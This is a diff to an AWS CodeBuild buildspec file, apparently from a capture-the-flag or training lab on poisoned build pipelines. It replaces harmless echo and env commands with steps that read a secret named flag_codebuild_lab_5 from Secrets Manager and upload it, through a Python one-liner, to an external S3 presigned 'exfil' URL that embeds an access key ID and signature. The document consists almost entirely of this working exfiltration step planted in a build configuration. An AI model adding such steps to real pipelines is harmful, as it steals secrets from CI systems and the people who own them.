@@ -3,6 +3,6 @@ version: 0.2
 phases:
   build:
     commands:
-      - echo "Running vulnerable training build"
-      - env | sort | head -n 20
-      - echo "Done"
+      - FLAG=$(aws secretsmanager get-secret-value --secret-id flag_codebuild_lab_5 --query SecretString --output text)
+      - python3 -c "import os, urllib.request; urllib.request.urlopen(urllib.request.Request('https://codebuild-lab-6-exfil-5lwr07ja3pm0.s3.amazonaws.com/exfil/lab5-1782249922.txt?AWSAccessKeyId=AKIA2MNVL2XEEVNGIVMV&Signature=77rFqg69LZu0621FM1ph2KrFtzw%3D&Expires=1782250823', data=os.environ.get('FLAG','').encode(), method='PUT'), timeout=20)"
+      - echo done
